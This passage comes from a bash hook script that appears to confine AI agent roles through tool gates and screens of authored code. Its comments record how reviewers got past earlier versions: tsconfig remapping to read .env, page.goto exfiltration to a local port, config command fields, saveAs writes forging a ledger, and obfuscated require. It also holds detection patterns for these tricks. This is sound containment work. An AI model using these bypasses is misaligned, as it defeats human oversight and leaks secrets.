          strings|tac|rev|fold|expand|unexpand|pr|base64|base32|iconv|\
          zcat|bzcat|xzcat|cut|paste|sort|git)
            continue ;;
        esac
        # READER FLAGS, both spellings. `--file=.claude/x` carries the
        # path in the same token; `--file .claude/x` carries it in the
        # next one. Checking only the attached form is the exact-vs-
        # attached defect this suite has recorded six times, so the
        # look-back is done in the same pass rather than in a second one
        # the first pass would have already pre-empted.
        __prev=""
        for __tok in "${__pwords[@]:1}"; do
          if printf '%s' "$__tok" | grep -Eqi "$PROT_RE"; then
            case "$__tok" in
              -*)
                __flag="${__tok%%=*}"
                prot_reader_flag "$__flag" && { __prev="$__tok"; continue; }
                self_protect_target "${__tok#*=}" "self-protect bash flag-operand $__flag" ;;
              *)
                prot_reader_flag "$__prev" && { __prev="$__tok"; continue; }
                self_protect_target "$__tok" "self-protect bash operand $__pcmd" ;;
            esac
          fi
          __prev="$__tok"
        done
      done <<< "$__psegs"
    fi
    ;;
esac

# --- Axis 2: tool gate ---------------------------------------------------
tool_matches_any() {
  # tool_matches_any <tool> <patterns-json-array> — shell-glob match.
  local tool="$1" patterns="$2" pat
  while IFS= read -r pat; do
    [ -n "$pat" ] || continue
    # shellcheck disable=SC2254
    case "$tool" in $pat) return 0 ;; esac
  done < <(printf '%s' "$patterns" | "$JQ" -r '.[]?' 2>/dev/null)
  return 1
}

TOOLS_DENY=$(harness_os_role_field "$ROLE" '.tools.deny')
TOOLS_ALLOW=$(harness_os_role_field "$ROLE" '.tools.allow')

if [ "$TOOLS_DENY" != "null" ] && tool_matches_any "$HOS_TOOL" "$TOOLS_DENY"; then
  harness_os_deny "tool-deny $HOS_TOOL" "[BLOCKED] Role '${ROLE}' is explicitly denied the '$HOS_TOOL' tool.

${ROLE_HEADER}

If this step genuinely needs '$HOS_TOOL', it belongs to a different role — return your findings and let the orchestrator dispatch the role whose mandate covers it."
fi

if [ "$TOOLS_ALLOW" != "null" ] && ! tool_matches_any "$HOS_TOOL" "$TOOLS_ALLOW"; then
  ALLOWED_LIST=$(printf '%s' "$TOOLS_ALLOW" | "$JQ" -r 'join(", ")' 2>/dev/null || echo "")
  harness_os_deny "tool-not-allowed $HOS_TOOL" "[BLOCKED] Role '${ROLE}' may not use the '$HOS_TOOL' tool.

${ROLE_HEADER}
Granted tools: ${ALLOWED_LIST}

This boundary is also your context budget — work within the granted tools, and hand anything outside them back to the orchestrator for the role whose mandate covers it."
fi

# --- Axis 5b: write-then-execute containment -----------------------------
# A role that authors EXECUTABLE code holds, in effect, whatever
# permissions that code will have when something runs it — its own
# granted test command, CI, or another role. Path scopes alone are then
# advisory: a spec file inside tests/e2e/ can `require('fs')` and read
# .env, which is precisely the escape this axis closes.
#
# Rule: for a governed role, code written into an executable file type
# may not reach for capabilities outside its role's envelope (filesystem,
# process spawning, network, eval/dynamic import). Legitimate needs are
# declared per role: "write": { "codeCapabilities": ["fs"] }. Applies
# regardless of whether THIS role can execute the file — authoring code
# that escapes is the vector, whoever runs it.
#
# It is a function, and it is defined here, because it must run on EVERY
# channel that authors a file. Round 4 found it wired only to
# Write/Edit/NotebookEdit: `echo 'require("fs")…' > tests/e2e/x.spec.ts`
# put the identical code on disk inside the role's own write scope with
# no screen at all, and the granted `npx playwright test` then ran it.
#
#   check_code_capabilities <target-path> <code-text> <channel-hint>
check_code_capabilities() {
  local target="$1" code="$2" via="${3:-}" rel
  [ -n "$target" ] || return 0
  [ -n "$code" ] || return 0
  rel=$(harness_os_relpath "$target")
  # A file with NO extension is runnable — that is exactly where a
  # `#!/bin/sh` shebang hides. The Bash channel has classified it that
  # way for several rounds, with a comment saying so, and refuses to
  # author one through `echo … > file` precisely because only Write and
  # Edit can screen the CONTENT. This gate skipped it, so the deny
  # message on the Bash side was routing agents into a hole: write it
  # with Write, where it is not screened at all.
  #
  # Same lesson as round 22 in a different dress. The rule was written
  # once per channel and the two channels disagreed about what counts as
  # code, so the stricter one referred work to the laxer one.
  # CONFIGURATION A RUNTIME FINDS BY ITSELF — checked BEFORE the
  # extension gate, because the whole point is that these are data
  # extensions the gate waves through.
  #
  # Round 25 closed the config handed to a runner through a flag. Round
  # 26 walked around it in one file, with no flag and no code:
  #
  #   tests/e2e/leak.spec.ts    import "@playwright/test"   (allow-listed)
  #   tests/e2e/tsconfig.json   {"compilerOptions":{"paths":
  #                               {"@playwright/test":["…/dotenv/config"]}}}
  #   npx playwright test       (granted outright)
  #
  # Playwright walks up from each test file looking for a tsconfig, finds
  # the authored one, and rewrites the specifier. `dotenv/config` reads
  # .env. All three secrets printed. Nothing named the tsconfig, so axis
  # 5c never saw it; it is a `.json`, so this screen never saw it; and
  # the spec imports only a declared package, so the allowlist was
  # satisfied.
  #
  # That last part is the finding, and it retires an assumption rather
  # than adding a pattern: **`codeImports` screens the specifier as
  # WRITTEN, and a resolution map the same role may author decides what
  # that specifier MEANS.** A role that declares its imports and can also
  # write a tsconfig has declared nothing at all.
  #
  # So the rule is derived from the role's own manifest instead of from
  # any framework's behaviour: a role that declares what its code may
  # import or do may not author the file that decides what its imports
  # resolve to, or the file a granted runner loads without being told to.
  # The operator owns those; they belong outside the role's write scope,
  # where the run still finds them and the role cannot rewrite them.
  #
  # This is a table of NAMES, and a table is a floor. It is a better
  # floor than the content tables it sits beside — these names are a
  # closed, documented, slow-moving set per ecosystem, unlike the open
  # set of ways to spell `require` — but `validate` says the same thing
  # it says about every floor here, and the boundary is still
  # `harness-os run` or splitting authoring from running.
  if [ "$(harness_os_role_field "$ROLE" '.write.codeImports')" != "null" ] \
     || [ "$(harness_os_role_field "$ROLE" '.write.codeCapabilities')" != "null" ]; then
    local cfg_kind=""
    case "${rel##*/}" in
      tsconfig.json|tsconfig.*.json|jsconfig.json|jsconfig.*.json|deno.json|deno.jsonc|import_map.json|importmap.json|.pnp.cjs|.pnp.js)
        cfg_kind="resolution" ;;
      package.json|.npmrc|.yarnrc|.yarnrc.yml|.pnpmrc|bunfig.toml)
        cfg_kind="resolution" ;;
      .babelrc|.babelrc.*|babel.config.*|.swcrc|.browserslistrc)
        cfg_kind="build" ;;
      Makefile|makefile|GNUmakefile|*.mk|Rakefile|Justfile|justfile|Taskfile.yml|Taskfile.yaml|CMakeLists.txt|build.gradle|build.gradle.kts|pom.xml)
        cfg_kind="build" ;;
      .mocharc|.mocharc.*|.nycrc|.nycrc.*|.c8rc|.c8rc.*|.taprc)
        cfg_kind="runner" ;;
      *.config.js|*.config.mjs|*.config.cjs|*.config.ts|*.config.mts|*.config.cts|*.config.json|*.config.yaml|*.config.yml)
        cfg_kind="runner" ;;
      .env|.env.*)
        cfg_kind="environment" ;;
    esac
    # A package directory inside the write scope is a resolution map by
    # another route: a module placed at `node_modules/<name>/` SHADOWS
    # the real package, so a declared import resolves to authored code
    # instead. The content of that code is screened like any other, but
    # the substitution itself is the same defect as the `paths` remap —
    # the declaration says which package, and this decides which files
    # that package is.
    case "/$rel" in
      */node_modules/*) cfg_kind="resolution" ;;
    esac
    if [ -n "$cfg_kind" ]; then
      local cfg_why
      case "$cfg_kind" in
        resolution) cfg_why="This file decides what a module specifier RESOLVES to. This role declares which packages its code may import, and a resolution map makes that declaration meaningless: an import of a declared package can be pointed at any module on disk, which is exactly how it was broken. The declaration and the map cannot both belong to the same role." ;;
        build)      cfg_why="This file rewrites code before it runs — a transform or plugin named here executes with the runner's permissions, and nothing in the authored source shows it." ;;
        runner)     cfg_why="A granted runner loads this file by convention, without anyone naming it on a command line, and a runner config can name a web-server command, a setup module or a reporter. Every one of those becomes a process." ;;
        environment) cfg_why="A framework auto-loads this file into the environment of every process the run starts." ;;
      esac
      harness_os_deny "write-runtime-config:$cfg_kind $rel" "[BLOCKED] Role '${ROLE}' may not author '$rel' — it is $cfg_kind configuration that a runtime picks up on its own.

${ROLE_HEADER}
File: $rel${via}

$cfg_why

This role declares what its code may import or do, which is a statement about the artifacts it produces. Configuration a runner discovers by convention is not one of those artifacts: it is an instruction to the runner, and it is not screened by anything, because it contains no code to screen.

Options, narrowest first:
  1. Put the setting in the file the operator owns, outside this role's write scope — the run still finds it, and the role cannot rewrite it.
  2. If this role genuinely needs its own, hand the file to the role that owns runner configuration.

This is a table of names, so it is a floor rather than a boundary. The boundary is running the executor under 'harness-os run --role ${ROLE}', or splitting authoring from running into two roles: harness-os validate says which applies here."
    fi
  fi
  case "${rel##*/}" in
    *.js|*.mjs|*.cjs|*.ts|*.mts|*.cts|*.tsx|*.jsx|*.py|*.rb|*.sh|*.bash|*.zsh|*.pl|*.php|*.ipynb|*.lua|*.ps1|*.awk|*.sed|*.jq) : ;;
    *.*) return 0 ;;
    *) : ;;
  esac
  local CAPS_ALLOW CODE_N CAP_ID CAP_WHAT LOAD FS_METHODS
  CAPS_ALLOW=$(harness_os_role_field "$ROLE" '.write.codeCapabilities')
  CAP_ID=""; CAP_WHAT=""
  # Normalise the forms a module name can be written in before matching,
  # so a synonym is not a bypass: strip whitespace around the specifier,
  # treat backticks as quotes, fold `node:` prefixes away, and decode
  # escapes. Reviewers broke earlier versions with await import("node:fs"),
  # backtick require, concatenation, require("f\x73") and octal
  # require("\146\163") — each is a different SPELLING of one capability,
  # so the matcher works on a normalised view rather than one syntax.
  # String.fromCharCode(...) is folded to a bare quote pair so a name
  # assembled from code points still reads as a runtime-built module.
  # A backslash before a quote is an escape in both shell and JS source,
  # and code arriving through the Bash channel is full of them
  # (`echo "import x from \"fs\""`). Fold them away first or the matcher
  # sees `from \"fs\"` and finds nothing.
  # Strip comments FIRST. A block comment is whitespace to the parser and
  # not to a regex, so `require/**/("dotenv")` sailed past every check
  # that expected only spaces between the keyword and its argument — and
  # the same blindness worked the other way, denying a spec because a
  # COMMENT mentioned a package. Removing comments fixes both directions
  # at once: the escape and the false positive were one bug.
  # …and close the gap the comment left behind. Removing `//x` leaves a
  # NEWLINE between the keyword and its argument, and the extraction
  # greps line by line, so `require //x⏎("dotenv")` would still slip
  # past. Pull the specifier back onto the keyword's line.
  # STRING LITERALS ARE MATCHED FIRST, and that ordering is the whole
  # correctness of this pass. Stripping comments with a bare `/\*.*?\*/`
  # spans from a `/*` inside one string to a `*/` inside another —
  #
  #     const a = "x /* y";
  #     const d = require("dotenv");     <-- swallowed as "comment"
  #     const b = "z */ w";
  #
  # — and the require vanishes. Found by probing this pass after adding
  # it, and it really did print the secret. Alternating string forms
  # BEFORE the comment forms makes a comment marker inside a literal stay
  # literal, which is what a lexer would do. Regex literals remain
  # ambiguous with division, as they are for every non-parsing tool.
  CODE_N=$(printf '%s' "$code" | perl -0777 -pe '
      s{ ("(?:\\.|[^"\\])*")
       | (\x27(?:\\.|[^\x27\\])*\x27)
       | (`(?:\\.|[^`\\])*`)
       | (/(?:\\.|\[(?:\\.|[^\]\\])*\]|[^/\\\[\n])+/[gimsuyvd]*)
       | (/\*.*?\*/)
       | (//[^\n]*)
       }{ (defined($1) || defined($2) || defined($3) || defined($4)) ? $& : " " }gsex;
      s{\b(require|import)\s*\(\s*}{$1(}gs;
      s{\bfrom\s*(["\x27])}{from $1}gs' 2>/dev/null || printf '%s' "$code")
  # A SECOND view, stripping comment shapes unconditionally, is appended
  # and screened alongside. The two views disagree on purpose, because
  # the two authoring channels disagree: when code arrives through Bash
  # (`echo '<code>' > spec.ts`) the outer quotes are the SHELL's, so the
  # lexer view above treats the whole program as one JS string literal
  # and never looks inside it. Screening the union means a pattern found
  # in either framing fires. It cannot add a false positive that the
  # lexer view avoids — stripping only ever removes text, and it removes
  # it to a space, so no two fragments can fuse into a match.
  CODE_N="$CODE_N
$(printf '%s' "$code" | perl -0777 -pe 's{/\*.*?\*/}{ }gs; s{(^|[^:"\x27\\])//[^\n]*}{$1}g;
      s{\b(require|import)\s*\(\s*}{$1(}gs;
      s{\bfrom\s*(["\x27])}{from $1}gs' 2>/dev/null || true)"
  CODE_N=$(printf '%s' "$CODE_N" \
    | sed -E 's/\\"/"/g; s/\\'"'"'/'"'"'/g' \
    | tr '\140' '"' \
    | sed -E "s/'/\"/g; s/[[:space:]]*\+[[:space:]]*\"\"//g; s/\"[[:space:]]*\+[[:space:]]*\"//g; s/node:/ /g" \
    | perl -pe 's/\\x\{?([0-9a-fA-F]{2})\}?/chr(hex($1))/ge; s/\\u\{?([0-9a-fA-F]{4})\}?/chr(hex($1))/ge; s/\\([0-7]{1,3})/chr(oct($1))/ge' 2>/dev/null \
    | sed -E "s/[[:space:]]+/ /g")
  [ -n "$CODE_N" ] || CODE_N="$code"
  # Any module-loading call at all — static import, require, dynamic
  # import(), createRequire, or the builtin-module accessors — followed
  # by the capability name. Every way a module can be reached, including
  # the indirect ones reviewers used (module.constructor._load, the
  # constructor.constructor Function trick, process.binding).
  # The bracket form — `globalThis["require"]("fs")`, `m["require"]` —
  # is the same access spelled as a computed member, which concatenation
  # folding reduces to a single literal before this runs. Round 25
  # flagged it as a blind spot rather than a working escape (`require`
  # is not a property of globalThis in Node, so that exact spelling
  # throws), and it costs one alternation to close either way.
  LOAD='(require|\[[[:space:]]*"(require|import)"[[:space:]]*\]|import|createRequire\([^)]*\)|process\.getBuiltinModule|process\.binding|module\.constructor\._load|constructor\.constructor|Deno\.|Bun\.)'
  # Filesystem work is matched by METHOD FAMILY rather than by an
  # enumerated list: any fs-shaped *Sync call, any fs.promises use, any
  # *FileSync. Enumerating method names was defeated by
  # openSync/readSync/readdirSync/…; a family pattern degrades gracefully
  # as Node adds more. The bracket form covers computed-member access
  # (m["read"+"File"+"Sync"](…)), which concatenation folding turns into
  # m["readFileSync"](…) before this runs.
  # Method names are matched WITHOUT requiring a following `(`. Binding
  # the method first and calling it later — `const w = m.writeFileSync;
  # … w(path, data)` — evaded the call-shaped pattern, and combined with
  # a dynamic module name it was a complete bypass. A capability method
  # named at all is the signal; you do not name writeFileSync by accident.
  FS_METHODS='\b(open|read|write|append|stat|lstat|fstat|copy|rename|rm|unlink|mkdir|rmdir|readdir|realpath|access|truncate|chmod|chown|link|symlink|readlink|utimes|watch|opendir|mkdtemp|cp)[A-Za-z]*Sync\b|\[[[:space:]]*"[^"]*Sync"[[:space:]]*\]|\bfs\.promises\b|\bfsPromises\b|\bcreate(Read|Write)Stream\b'
  if printf '%s' "$CODE_N" | grep -Eq "${LOAD}[[:space:]]*\([[:space:]]*\"[[:space:]]*(fs|fs/promises|path|os)[[:space:]]*\"|from[[:space:]]*\"[[:space:]]*(fs|fs/promises)[[:space:]]*\"|^[[:space:]]*import[[:space:]]+(os|shutil|pathlib|io|glob)([[:space:],.]|$)|^[[:space:]]*from[[:space:]]+(os|shutil|pathlib|io|glob)([[:space:].]|$)|(^|[^a-zA-Z_.])open[[:space:]]*\([[:space:]]*[\"'\`]|${FS_METHODS}|readFile[[:space:]]*\(|Path[[:space:]]*\("; then
    CAP_ID='fs'; CAP_WHAT='filesystem access (fs / os / open / readFileSync …) — code that can read or write any path, ignoring the role scopes'
  elif printf '%s' "$CODE_N" | grep -Eq "${LOAD}[[:space:]]*\([[:space:]]*\"[[:space:]]*(child_process|node:child_process)[[:space:]]*\"|from[[:space:]]*\"[[:space:]]*child_process[[:space:]]*\"|^[[:space:]]*import[[:space:]]+(subprocess|pty|multiprocessing)([[:space:],.]|$)|^[[:space:]]*from[[:space:]]+subprocess([[:space:].]|$)|execSync|spawnSync|execFileSync|\bspawn[[:space:]]*\(|subprocess\.(run|Popen|call|check_output)|os\.(system|popen|exec|spawn)"; then
    CAP_ID='process'; CAP_WHAT='process spawning (child_process / subprocess / os.system …) — code that runs commands no command group checked'
  elif printf '%s' "$CODE_N" | grep -Eq '\bworker_threads\b'; then
    # A Worker thread does not inherit Node's permission-model filesystem
    # restrictions, so authoring one is authoring a way out of the very
    # profile `harness-os run` installs. It is not process spawning and
    # was on no capability list at all; a reviewer read a secret through
    # it with the runtime profile active and the static screen silent.
    # Only worker_threads. A bare `new Worker(...)` inside page.evaluate
    # is a BROWSER worker, which cannot touch the host at all — flagging
    # it made the axis unusable for any app that has one. Node exposes no
    # global Worker, so a Node worker must name worker_threads to exist.
    CAP_ID='process'; CAP_WHAT='a worker thread (worker_threads) — a worker does NOT inherit the runtime permission profile, so it is a way out of the containment that profile installs'
  elif printf '%s' "$CODE_N" | grep -Eq "${LOAD}[[:space:]]*\([[:space:]]*\"[[:space:]]*(net|http|https|dgram|tls|dns|inspector)[[:space:]]*\"|from[[:space:]]*\"[[:space:]]*(net|http|https|dgram)[[:space:]]*\"|^[[:space:]]*import[[:space:]]+(socket|urllib|requests|httpx|ftplib|smtplib|telnetlib)([[:space:],.]|$)|^[[:space:]]*from[[:space:]]+(socket|urllib|requests|httpx)([[:space:].]|$)|\bfetch[[:space:]]*\(|XMLHttpRequest|WebSocket[[:space:]]*\("; then
    CAP_ID='network'; CAP_WHAT='raw network access (net / http / socket / fetch …) — an exfiltration channel'
  elif printf '%s' "$CODE_N" | grep -Eq "\b(request|apiRequest|context)\.(get|post|put|patch|delete|fetch|head)[[:space:]]*\([[:space:]]*[\"'\`]?[a-zA-Z][a-zA-Z0-9+.-]*://|\bsendBeacon[[:space:]]*\(|\bnavigator\.sendBeacon\b" \
       && ! harness_os_code_calls_in_scope "$CODE_N" "$(harness_os_role_field "$ROLE" '.network.allow')" \
            "\.(get|post|put|patch|delete|fetch|head)"; then
    # The test framework's OWN http client is the natural exfiltration
    # primitive in a test-authoring role: `request` is a standard
    # Playwright fixture and `request.get(url)` reaches any host. An axis
    # whose stated job is closing exfiltration channels cannot cover
    # `fetch(` and miss the one the role actually has in scope.
    CAP_ID='network'; CAP_WHAT='the test framework''s HTTP client (request.get / page.request / sendBeacon) pointed at an arbitrary host — the same exfiltration channel as fetch(), reached through a fixture'
  elif printf '%s' "$CODE_N" | grep -Eq "\beval[[:space:]]*\(|new Function[[:space:]]*\(|__import__[[:space:]]*\(|\bimportlib\b|\bexec[[:space:]]*\(|vm\.(run|compile)"; then
    CAP_ID='eval'; CAP_WHAT='eval / new Function — code the static check cannot read'
  elif printf '%s' "$CODE_N" | tr '\n' ' ' | grep -Eq '[=,:([][[:space:]]*require[[:space:]]*([];,)}]|$)'; then
    # `const r = require; r("dotenv")` — the loader reached through an
    # alias. Nothing downstream can follow the name, so neither the
    # capability branches nor the import allowlist ever see the
    # specifier. Same shape as a capability method bound before use, and
    # found by probing this axis rather than by waiting for the next
    # reviewer. `createRequire` is excluded by the leading boundary; a
    # real call is excluded because it IS followed by '('.
    CAP_ID='eval'; CAP_WHAT='the module loader bound to a name (`const r = require`) rather than called — the static check cannot follow an alias to see what it loads'
  elif printf '%s' "$CODE_N" | grep -Eq "${LOAD}[[:space:]]*\([[:space:]]*[^\"[:space:])]"; then
    # INVERTED, and this is the important one. Every previous version
    # asked "does the module name look like one of the dangerous ones?",
    # and lost, round after round, to the next spelling: node:fs, f\x73,
    # \146\163, String.fromCharCode(102,115), ["f","s"].join(""),
    # ("f")+("s"). There is no end to that list, because the argument is
    # an arbitrary expression.
    #
    # So the question is inverted: a module specifier that is NOT a plain
    # quoted literal cannot be read by a static check at all, and is
    # refused as the 'eval' capability regardless of what it evaluates
    # to. Legitimate code names its imports; a name assembled at runtime
    # is either an escape or a pattern that belongs behind an explicit
    # grant. This is the one shape in the screen that does not need
    # updating when someone invents a new way to spell "fs".
    CAP_ID='eval'; CAP_WHAT='a module name built at runtime rather than written as a literal — the static check cannot see what it resolves to, so it cannot be scoped'
  fi
  # A file:// URL pointed at the filesystem is a read channel even with
  # no host module involved (page.goto("file:///…")).
  # `file:/x` is normalised to `file:///x` by every browser, so matching
  # only the three-slash form missed the shortest spelling of it.
  if [ -z "$CAP_ID" ] && printf '%s' "$CODE_N" | grep -Eq 'file:/'; then
    CAP_ID='fs'; CAP_WHAT='a file: URL — the browser/runtime reads the path directly, with no host module for a scope check to see'
  fi
  # THE WRITE DIRECTION OF THE SAME FAMILY.
  #
  # Round 38's lesson was that one call — `page.goto` — had two channels
  # and only one was modelled. Round 39 found that shape one level up,
  # across a whole family: the screen resolves the READ direction of
  # framework file APIs (`setInputFiles`, `attach({path})`) against
  # `read.allow`, and models the WRITE direction of none of them.
  #
  #     await page.screenshot({ path: '/tmp/o.png' })            ALLOW
  #     await context.storageState({ path: '/tmp/o.json' })      ALLOW
  #     await download.saveAs('docs/e2e-ledger.json')            ALLOW
  #     await page.screenshot({ path: '.claude/harness-os.json' })  ALLOW
  #
  # every one of which the same role's Write tool refuses. The reviewer
  # authored a spec inside `tests/e2e/**`, ran it with the composer's own
  # `npx playwright test`, and put its exact chosen bytes at an arbitrary
  # path through an in-page Blob download and `saveAs`. Arbitrary content
  # to an arbitrary path, from a role whose only write grant is a test
  # directory.
  #
  # The write direction is strictly the worse one. A read leaks; a write
  # to `docs/e2e-ledger.json` forges the verdict this whole system exists
  # to make trustworthy, and a write to the manifest or the hook
  # registration disarms the kernel. The screen was spending its care on
  # the lower-severity direction of each call.
  #
  # INVERTED rather than enumerated, because `screenshot`, `pdf`,
  # `saveAs`, `storageState`, `recordHar`, `recordVideo`,
  # `toMatchSnapshot` and the next output option have no end — the losing
  # game this document keeps naming. A `path:` option in an authored call
  # is a WRITE unless the method is a known READER, which is round 15's
  # self-protection inversion applied here. The reader list is short,
  # closed, and already written above.
  if [ -z "$CAP_ID" ]; then
    local wr_call wr_meth wr_arg wr_lit wr_abs wr_rel wr_dir wr_wscope
    wr_dir=$(dirname "$(harness_os_normalize_path "$target")")
    wr_wscope=$(harness_os_role_field "$ROLE" '.write.allow')
    while IFS= read -r wr_call; do
      [ -n "$wr_call" ] || continue
      wr_meth=$(printf '%s' "$wr_call" | sed -E 's/^\.?([A-Za-z_][A-Za-z0-9_]*).*/\1/')
      case "$wr_meth" in
        attach|attachFile|setInputFiles|uploadFile|uploadFiles|setFiles) continue ;;
      esac
      case "$wr_call" in
        *saveAs*)
          wr_arg="${wr_call#*(}"
          wr_arg=$(printf '%s' "$wr_arg" | sed -E 's/^[[:space:]]+//; s/[[:space:]]*[,)].*$//') ;;
        *)
          case "$wr_call" in *[Pp]ath:*|*[Pp]ath\ :*) : ;; *) continue ;; esac
          wr_arg=$(printf '%s' "$wr_call" | sed -E 's/[[:space:]]*:[[:space:]]*/:/g')
          wr_arg="${wr_arg#*[Pp]ath:}"
          wr_arg=$(printf '%s' "$wr_arg" | sed -E 's/[,)}].*$//; s/^[[:space:]]+//; s/[[:space:]]+$//') ;;
      esac
      [ -n "$wr_arg" ] || continue
      case "$wr_arg" in
        \"*\") wr_lit="${wr_arg%\"}"; wr_lit="${wr_lit#\"}"; case "$wr_lit" in *\"*) wr_lit="" ;; esac ;;
        \'*\') wr_lit="${wr_arg%\'}"; wr_lit="${wr_lit#\'}"; case "$wr_lit" in *\'*) wr_lit="" ;; esac ;;
        *) wr_lit="" ;;
      esac
      case "$wr_lit" in *'${'*|*'`'*) wr_lit="" ;; esac
      if [ -z "$wr_lit" ]; then
        CAP_ID='fs'; CAP_WHAT="a framework file API whose OUTPUT path is built at run time ('$wr_arg') — a path that does not exist until the test runs cannot be held to this role's write scope, and the framework creates the file directly with no host module for a check to see"
        break
      fi
      case "$wr_lit" in *://*) continue ;; esac
      case "$wr_lit" in /*) wr_abs="$wr_lit" ;; *) wr_abs="$wr_dir/$wr_lit" ;; esac
      wr_rel=$(harness_os_relpath "$wr_abs")
      # The root of trust first, on this channel too: a write aimed at
      # the manifest, the state directory or the kernel is refused
      # whatever the role's other grants say.
      if harness_os_is_manifest_path "$(harness_os_normalize_path "$wr_abs")" \
         || printf '%s' "$wr_rel" | grep -Eq '(^|/)\.claude/(harness-os\.json|settings(\.local)?\.json|hooks/)'; then
        CAP_ID='fs'; CAP_WHAT="a framework file API aimed at '$wr_rel' — that is the harness OS itself, and no governed role may write it through any channel"
        break
      fi
      if [ "$wr_wscope" = "null" ]; then
        CAP_ID='fs'; CAP_WHAT="a framework file API that writes '$wr_rel' — this role has no write grants at all, and a file the framework creates is a write like any other"
        break
      fi
      harness_os_path_in_scope "$wr_rel" "$wr_wscope" && continue
      CAP_ID='fs'; CAP_WHAT="a framework file API that writes '$wr_rel', which is outside this role's write scope ($(printf '%s' "$wr_wscope" | "$JQ" -r 'join(", ")' 2>/dev/null)) — the file the framework creates is a write, and the Write tool refuses that same path"
      break
    done < <(printf '%s' "$CODE_N" \
      | grep -oE "\.[A-Za-z_][A-Za-z0-9_]*[[:space:]]*\([^)]*[Pp]ath[[:space:]]*:[^)]*\)?|\.saveAs[[:space:]]*\([^)]*\)?" 2>/dev/null)
  fi
  # AUTHORED NAVIGATION, HELD TO THE NETWORK SCOPE.
  #
  # Round 33 built `network.allow` and wrote that "who a command talks to
  # was not modelled at all". Rounds 34-36 carried it to curl's override
  # flags, to WebFetch and to the MCP arm. It never reached the browser
  # that a granted test runner drives — and for a Playwright role that is
  # the channel, not an edge case.
  #
  # Round 38 wrote a spec whose whole body was
  #
  #     await page.goto("http://127.0.0.1:9999/exfil?d=" + secret)
  #
  # authored it inside the composer's own write scope, ran it with the
  # composer's own `npx playwright test`, and chromium made the request.
  # Both steps ALLOW. External egress, SSRF to any local port, and the
  # role's in-scope context on the wire — the three capabilities the
  # network axis exists to stop.
  #
  # The screen HAD `page.goto` in view: round 32 taught it to refuse
  # `page.goto("file://…")` as a local read. It modelled goto→file and
  # missed goto→network while an entire network axis was being built for
  # every other channel. That is this document's most-repeated defect
  # with the two halves of one call as the two channels.
  #
  # And the reviewer's other half is the sharper one. The exfil branches
  # above are destination-BLIND and total, so a composer authoring
  # `request.get("http://localhost:4173/api")` — a fetch of its OWN
  # in-scope app — is refused as "an exfiltration channel", while
  # `page.goto("http://127.0.0.1:9999")` to a genuinely forbidden host
  # was allowed. The check that fired was the one that should not have,
  # and the one that should was absent.
  #
  # So for a role that declares a network scope, a network call is judged
  # by its DESTINATION rather than by its existence: a literal URL is
  # parsed and scope-checked like any other, and a destination built at
  # run time is refused, which is round 20's inversion (prove it inert;
  # do not guess at it) applied to a host instead of a path. A role with
  # no declared scope keeps the old blanket behaviour, because there is
  # nothing to check against.
  if [ -z "$CAP_ID" ]; then
    local nav_scope nav_call nav_arg nav_lit nav_auth
    nav_scope=$(harness_os_role_field "$ROLE" '.network.allow')
    while IFS= read -r nav_call; do
      [ -n "$nav_call" ] || continue
      nav_arg="${nav_call#*(}"
      nav_arg=$(printf '%s' "$nav_arg" | sed -E 's/^[[:space:]]+//; s/[[:space:]]*[,)].*$//')
      case "$nav_arg" in
        \"*\") nav_lit="${nav_arg%\"}"; nav_lit="${nav_lit#\"}"
               # A quote surviving inside is a concatenation, not a
               # literal: `"http://" + host + "/x"` starts and ends with
               # a quote and names no host at all. The framework-file-API
               # branch has made this same test since round 20.
               case "$nav_lit" in *\"*) nav_lit="" ;; esac ;;
        \'*\') nav_lit="${nav_arg%\'}"; nav_lit="${nav_lit#\'}"
               case "$nav_lit" in *\'*) nav_lit="" ;; esac ;;
        *) nav_lit="" ;;
      esac
      case "$nav_lit" in *'${'*|*'`'*) nav_lit="" ;; esac
      # A relative path is a navigation against the framework's own
      # baseURL, which is the app under test — not a destination this
      # kernel can or should second-guess.
      case "$nav_lit" in /*|'#'*|'?'*) continue ;; esac
      # An empty operand is a call with no destination argument at all
      # (`context.request()`), not a hidden one.
      case "$nav_arg" in '') continue ;; esac
      if [ -z "$nav_lit" ]; then
        # A destination built at run time cannot be scoped — round 20's
        # inversion, applied to a host instead of a path. But it is
        # refused only where a scope was DECLARED: `navigateTo(url)` with
        # `url = process.env.APP_URL || '/forms'` is an ordinary spec
        # idiom, and a role whose manifest says nothing about
        # destinations has not asked for it to be checked. Declaring
        # `network.allow` is the statement that connections matter here,
        # and it is what turns an unverifiable destination into a
        # refusal.
        [ "$nav_scope" = "null" ] && continue
        CAP_ID='network'; CAP_WHAT="a browser navigation whose destination is built at run time ('$nav_arg') — a host assembled from expressions cannot be checked against this role's network scope, and the browser dials it directly with no host module for a scope check to see"
        break
      fi
      harness_os_is_network_url "$nav_lit" || continue
      nav_auth=$(harness_os_url_authority "$nav_lit")
      [ -n "$nav_auth" ] || continue
      if [ "$nav_scope" = "null" ]; then
        CAP_ID='network'; CAP_WHAT="a browser navigation to '$nav_auth' — this role declares no network scope, so no destination can be shown to be permitted"
        break
      fi
      if ! harness_os_authority_in_scope "$nav_auth" "$nav_scope"; then
        CAP_ID='network'; CAP_WHAT="a browser navigation to '$nav_auth', which is outside this role's network scope ($(printf '%s' "$nav_scope" | "$JQ" -r 'join(", ")' 2>/dev/null))"
        break
      fi
    done < <(printf '%s' "$CODE_N" \
      | grep -oE "\.(goto|navigateTo|navigate|open|setExtraHTTPHeaders)[[:space:]]*\([^)]*\)?|\b(request|apiRequest|context)\.(get|post|put|patch|delete|fetch|head)[[:space:]]*\([^)]*\)?" 2>/dev/null)
  fi
  # CONFIGURATION THAT IS A COMMAND. Round 25's finding, and the one
  # that says the most about what this screen is: every branch above
  # looks for CODE that reaches a host capability, and a test framework
  # offers a first-class field whose value is a shell command in plain
  # English:
  #
  #     export default { webServer: { command: "cat .env > leak.txt" } }
  #
  # Nothing there is code. No import, no call, no obfuscation — and
  # `npx playwright test -c that-file` is a permitted command. The
  # identical intent written as `execSync("cat .env")` is refused by the
  # branch fifty lines up. Only the data spelling escaped.
  #
  # So a `command:`/`cmd:` key bound to a string is treated as process
  # spawning, because that is exactly what the runtime does with it. Be
  # honest about what this is: an enumeration, and therefore a floor
  # rather than a boundary, exactly like the language branches below.
  # The structural answer is in `harness-os validate`, which now names
  # any role that both authors and runs, and in `harness-os run`.
  if [ -z "$CAP_ID" ] \
     && printf '%s' "$CODE_N" | grep -Eq '(^|[^A-Za-z0-9_$.])["'"'"'`]?(command|cmd)["'"'"'`]?[[:space:]]*:[[:space:]]*["'"'"'`]'; then
